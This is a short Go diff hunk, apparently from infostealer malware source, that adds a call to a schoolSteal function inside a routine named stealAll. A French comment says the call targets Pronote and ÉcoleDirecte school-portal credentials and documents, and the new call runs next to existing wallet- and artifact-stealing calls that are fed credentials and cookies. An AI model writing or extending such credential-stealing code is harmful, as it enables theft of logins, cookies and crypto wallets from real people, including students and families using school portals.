@@ -427,6 +427,9 @@ func stealAll(withChat bool) {
 		}
 	}
 
+	// Salon scolaire : identifiants Pronote / ÉcoleDirecte et documents.
+	schoolSteal(creds, cookies)
+
 	stealWallets()
 	stealArtifacts()
 	lastStealAt.Store(time.Now().Unix())
